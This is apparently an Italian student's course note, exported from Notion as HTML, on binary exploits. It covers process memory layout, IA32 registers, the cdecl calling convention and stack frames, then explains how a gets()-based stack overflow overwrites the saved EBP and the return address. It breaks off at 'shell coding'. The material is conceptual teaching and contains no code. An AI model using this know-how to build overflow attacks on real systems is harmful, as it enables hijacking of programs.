<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>BINARY EXPLOITS</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="7aaf70f2-fc38-4f4c-ba2f-bfe50d673d1d" class="page sans"><header><h1 class="page-title">BINARY EXPLOITS</h1><p class="page-description"></p></header><div class="page-body"><ul id="6b6282e3-2aa1-4faf-9552-a1751c6033df" class="toggle"><li><details open=""><summary>Teoria</summary><p id="dea6a8a1-06ee-463c-9139-7d2866f0464e" class="">Gli attacchi applicativi sfruttano le vulnerabilità del sistema operativo, hardware sottostante e software in esecuzione locale. Gli obbiettivi di questo attacco sono:</p><ul id="2f5f8f0d-cdd3-4b63-ba78-d1975b64ff03" class="bulleted-list"><li style="list-style-type:disc">Fermare il processo (Denial Of Service – DOS)</li></ul><ul id="a74f0835-a506-49dc-9d45-833b0823d2f9" class="bulleted-list"><li style="list-style-type:disc">Dirottare il flusso di esecuzione (Esecuzione di codice maligno)</li></ul><ul id="66283c11-d634-47fc-be99-5e6d8c9fd37d" class="bulleted-list"><li style="list-style-type:disc">Ottenere i privilegi di altri utenti</li></ul><p id="d18e62f4-891d-44cd-bcc6-742549e143c8" class=""><mark class="highlight-blue">Conoscenze preliminari</mark></p><p id="6e81565d-ff28-4c54-8dd6-07348e958a3f" class="">I binary exploits sono attacchi molti specifici, che attaccano il codice salvato in memoria e riguardano prevalentemente codice scritto in C (linguaggio più vicino all’hardware che non realizza controlli automatici sui dati). Quest’ultimi attacchi richiedono basi su:</p><ul id="dec7081c-e9ca-4c8b-8beb-788bd595f95b" class="bulleted-list"><li style="list-style-type:disc">Disposizione del processo in memoria = Lo spazio di indirizzamento di un processo in memoria è suddiviso in una serie di segmenti:<ul id="5deed5d4-f0a5-4520-bd2d-3a1dcd9bd32f" class="bulleted-list"><li style="list-style-type:circle">Segmento .text = contenente il codice eseguibile.</li></ul><ul id="44520827-ab7f-4828-9a20-3e3423ea3816" class="bulleted-list"><li style="list-style-type:circle">Segmento .data = contenente i dati inizializzati</li></ul><ul id="7c840fe3-bc10-4d2b-8402-26b1862b4e82" class="bulleted-list"><li style="list-style-type:circle">Segmento .bss = contenete le variabili non inizializzate</li></ul><ul id="fbde33f0-afa3-4b93-b598-7cba5203015d" class="bulleted-list"><li style="list-style-type:circle">Stack d’esecuzione = con i record di attivazione del processo e variabili locali.</li></ul><ul id="7ca4bfeb-c701-4eb6-8427-28a86ac67457" class="bulleted-list"><li style="list-style-type:circle">Heap = segmento di memoria contenente le variabili allocate dinamicamente.<figure id="ed4f77fc-d8e4-4f33-90db-d9489908d3a8" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled.png"><img style="width:204px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled.png"/></a></figure></li></ul></li></ul><p id="1b3e326b-932a-4ae9-b2a0-532ed76bc5d9" class="">Lo stack e heap condividono dinamicamente uno spazio di memoria. Lo stack parte dall’alto e va verso il basso, mentre l’heap viceversa.</p><ul id="b1ecf981-835c-4810-bc10-94f3b24d1295" class="bulleted-list"><li style="list-style-type:disc">Architettura sottostante (nel nostro caso IA32) = esistono una serie di registri importanti da considerare:<ul id="501a0d56-bd86-4a68-87d2-4df656f43896" class="bulleted-list"><li style="list-style-type:circle">Registri general purpose per eseguire operazioni aritmetico logiche come EAX, EBX, ECX, EDX (i 16 bit meno significatici di questi registri possono essere visti come registri a 16 bit dal nome AX, BX, CX, DX. Ognuno di questi può essere diviso in due registri a 8 bit del nome AH [primi 8 bit] e AL [ultimi 8 bit]).</li></ul><ul id="be0909cd-9193-46e1-8a20-1d1040416853" class="bulleted-list"><li style="list-style-type:circle">Registri per la copia di dati in memoria come ESI (sorgente) e EDI (destinazione).</li></ul><ul id="810eeb2e-8ae4-4a65-9d5a-5375f58b0cb1" class="bulleted-list"><li style="list-style-type:circle">Registri per il controllo di flusso:<ul id="2b78a0f8-71c3-4af8-8b06-e75cef977bae" class="bulleted-list"><li style="list-style-type:square">EIP (instruction pointer) = Il registro EIP è un registro specializzato di tipo puntatore che contiene sempre l’indirizzo della prossima istruzione da eseguire. Ogni istruzione lo modifica implicitamente.</li></ul><ul id="d63de9e7-ce05-49cd-ab2e-38c4938588c6" class="bulleted-list"><li style="list-style-type:square">EFLAGS = contiene i bit di flag che vengono modificati dalla ALU in base al risultato delle operazioni aritmetico/logiche.</li></ul></li></ul><ul id="3b93840a-4ca8-4cc8-8e85-e3a22d41de7e" class="bulleted-list"><li style="list-style-type:circle">Registri per la gestione dello stack:<ul id="93a49dc2-fffd-40d8-bf01-3c6582e9adca" class="bulleted-list"><li style="list-style-type:square">ESP = stack pointer che contiene l’indirizzo della cima dello stack. Quando viene eseguita un operazione di push, ESP viene decrementato di 4 byte e scrive il valore nella cella di memoria puntata, mentre quando viene eseguita un operazione di POP recupera il valore puntato da ESP e poi incrementa il valore di ESP di 4.</li></ul><ul id="75fcf8cd-c68f-4b0a-ab68-5778051fa650" class="bulleted-list"><li style="list-style-type:square">EBP = base pointer che contiene l’indirizzo segnala inizio dello stack locale (la funzione).</li></ul></li></ul></li></ul><p id="fbb98d25-8fce-4d1d-a6eb-ec51a6a712ee" class=""><mark class="highlight-teal">Chiamata a funzione ed evoluzione sullo stack</mark></p><p id="1476af06-b85b-475c-aa7d-4e5f3a47ba00" class="">Il compilatore, nel passaggio da linguaggio C ad Assembly, adotta una serie di convenzioni standard come per esempio la chiamata di default __cdecl. I passi di questa conversione sono:</p><ul id="72b56e6f-f48b-4b96-942e-5a57dcc5d314" class="bulleted-list"><li style="list-style-type:disc">PUSH sullo stack di tutti i parametri attuali di chiamata in ordine inverso rispetto alla signature del metodo.</li></ul><figure id="393bff65-92d5-4d10-8257-9bdb33d522c1" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%201.png"><img style="width:290px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%201.png"/></a></figure><p id="a61efc2f-598d-459e-9650-81f94dbedbcc" class="">Sullo stack sono stati salvati i parametri invocati dalla funzione in ordine inverso (prima il 5 poi il 4). ESP viene decrementato di 4 ad ogni PUSH.</p><ul id="7c39eb41-4fe3-4781-8cb9-3c9d6471bc65" class="bulleted-list"><li style="list-style-type:disc">CALL della funzione. Questa operazione comporta il PUSH dell’indirizzo di ritorno (indirizzo successivo dell’indirizzo della CALL) all’interno dello stack e il caricamento in EIP dell’indirizzo della funzione chiamata.</li></ul><figure id="995fc1ee-7458-4376-8a8e-11593d800068" class="image" style="text-align:right"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%202.png"><img style="width:144px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%202.png"/></a></figure><figure id="c58736e4-c9ef-483e-839b-c1a65867dd79" class="image" style="text-align:left"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%203.png"><img style="width:192px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%203.png"/></a></figure><p id="c713dfc7-df64-4ddf-be18-e4ab8c4790c2" class="">Viene eseguito il PUSH dell’indirizzo dell’istruzione successiva alla CALL (ovvero ADD).</p><ul id="37db5a07-914a-445f-b197-05d9ec898884" class="bulleted-list"><li style="list-style-type:disc">Si passa al codice della funzione chiamata. Le prime due operazioni eseguite sono:<ul id="c22ed6d0-72e5-44bb-bdca-30c6cde6ddc3" class="bulleted-list"><li style="list-style-type:circle">PUSH del contenuto di EBP all’interno dello stack.</li></ul><ul id="fd1a22af-dbd9-484d-8629-8e824224cb24" class="bulleted-list"><li style="list-style-type:circle">MOV del contenuto di ESP all’interno di EBP (il registro EBP contiene lo stesso indirizzo di ESP).</li></ul><p id="6725737d-d3b8-40e1-af03-634071b6b1af" class="">Questa operazione viene eseguita in quanto EBP contiene il riferimento per le variabili locali del chiamante e di conseguenza non deve essere perso, ma il chiamato ha bisogno di settarlo al proprio “sistema di riferimento”.</p></li></ul><figure id="35af9dce-a3a2-456f-be8d-091e1cc2efe5" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%204.png"><img style="width:316px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%204.png"/></a></figure><figure id="788fcc10-0b47-422b-b89c-46b3bc593b48" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%205.png"><img style="width:319px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%205.png"/></a></figure><ul id="1c080b60-3855-4283-8ed5-1314954504b7" class="bulleted-list"><li style="list-style-type:disc">Il chiamato esegue le sue operazioni prendendo come base su cui muoversi all’interno dello stack il contenuto di EBP.</li></ul><ul id="ba4c80b9-5644-472a-999d-9eac0a9c179d" class="bulleted-list"><li style="list-style-type:disc">Il chiamato salva il risultato nel registro EAX.</li></ul><ul id="eccc304d-dbe9-4057-b4c6-3eccf54ad2cb" class="bulleted-list"><li style="list-style-type:disc">Dopo aver eseguito tutte le sue operazioni, avviene il ripristino di ESP e EBP. Questo passaggio viene eseguito da due operazioni:<ul id="2b57ff89-7be1-4b12-9fd8-7590aa41e5a4" class="bulleted-list"><li style="list-style-type:circle">MOV del contenuto di EBP all’interno di ESP (il registro ESP contiene lo stesso indirizzo di EBP).</li></ul><ul id="500c31ae-6c1d-4802-a4aa-92f35a77ed65" class="bulleted-list"><li style="list-style-type:circle">POP del contenuto di EBP. Con l’operazione di POP viene recuperato il valore di ESP (grazie all’operazione di prima è lo stesso di EBP), viene inserito all’interno del registro EBP tale valore (ovvero l’indirizzo iniziale di EBP, il riferimento per il chiamante) e il valore di ESP viene incrementato di 4.</li></ul><figure id="054a9eaf-a05d-419f-aa67-b94b855cd295" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%206.png"><img style="width:326px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%206.png"/></a></figure><figure id="2595c9d4-0b33-41e7-8814-ce7a9fdc810c" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%207.png"><img style="width:325px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%207.png"/></a></figure></li></ul><ul id="8de8f5d4-338b-4830-86d3-954f7ab1dc68" class="bulleted-list"><li style="list-style-type:disc">È presente l’istruzione RET con il ritorno al chiamante. Essa prevede un POP in EIP ovvero: viene recuperato il valore di ESP (era l’indirizzo di ritorno dalla funzione precedentemente salvato), viene salvato tale valore in EIP e viene incrementato di 4 il valore di ESP.<figure id="d8561fea-ca89-4152-8cd7-69d15be77cc8" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%208.png"><img style="width:339px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%208.png"/></a></figure><p id="d8976f6c-cddd-44a9-a308-25cc3adbb91e" class="">La prossima istruzione che viene eseguita è quella contenuta all’interno de registro EIP, ovvero l’istruzione all’indirizzo 0x8040201A. Come abbiamo visto prima è l’istruzione di ADD.</p></li></ul><ul id="e5804ec3-9362-4dd7-989b-7cc7dab6fa55" class="bulleted-list"><li style="list-style-type:disc">E&#x27; compito del chiamante rimuovere i parametri attuali dallo stack.</li></ul><p id="2facc9f2-84e2-41d5-8a35-760f1b303467" class=""><mark class="highlight-blue">Stack overflow</mark></p><p id="da1788ad-ef77-4455-8fcf-cf3f44d18eec" class="">Per attuare lo stack overflow è necessaria la presenza, all’interno di una funzione, di un buffer (che ovviamente è sullo stack) che può essere alimentato da input esterni. In questo caso l’attaccante può riempiere il buffer oltre i suoi limiti fino a porre sullo stack un nuovo indirizzo di ritorno di chiamata, sovrascrivendo quello precedente (questo in C è possibile attraverso l’utilizzo di funzioni poche sicure come gets che non effettua nessun controllo sulla lunghezza e legge da stdin fino a quando non incontra uno 0 binario). In questo modo, cambiando l’indirizzo di ritorno, il flusso di controllo procede dall’indirizzo inserito dall’attaccante. Infatti, come abbiamo visto precedentemente, dopo la chiamata di una funzione sullo stack si ha questa situazione:</p><figure id="b8c57a0b-6f4f-4b63-a94d-93209fcb03f1" class="image"><a href="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%209.png"><img style="width:296px" src="BINARY%20EXPLOITS%207aaf70f2fc384f4cba2fbfe50d673d1d/Untitled%209.png"/></a></figure><p id="cfbac51c-1ff2-4f73-9744-f80f88962968" class="">Dove il buffer è stato definito all’interno della funzione. In questo contesto quindi sono necessari:</p><ul id="9fd81a9e-efaf-4cc3-a455-80c10dc0de2c" class="bulleted-list"><li style="list-style-type:disc">10 byte per riempiere il buffer.</li></ul><ul id="c80a131e-9659-4579-bf99-bdf2ec4e42a5" class="bulleted-list"><li style="list-style-type:disc">4 byte per sovrascrivere il contenuto di EBP</li></ul><ul id="b813f1ec-4946-4e0a-87fe-78ccf2b2a1d8" class="bulleted-list"><li style="list-style-type:disc">4 byte per sovrascrivere l’indirizzo di ritorno</li></ul><p id="6df67f55-e753-4257-9118-b760e736dd31" class="">Le conseguenze possono essere diverse:</p><ul id="38d56348-3e62-4a0b-8056-9ef22c52d641" class="bulleted-list"><li style="list-style-type:disc">Denial Of Service = Se l’indirizzo di ritorno inserito è illecito dà segmentation fault</li></ul><ul id="d035126e-2196-43ea-909c-e4a41b0d25b1" class="bulleted-list"><li style="list-style-type:disc">L’attaccante individua un valido indirizzo di ritorno e prende il controllo dell’esecuzione. Le alternative sono di due tipi:<ul id="ba4a9881-b03b-4b50-b3d1-7ea5bd1e38b3" class="bulleted-list"><li style="list-style-type:circle">Shell coding = viene iniettato 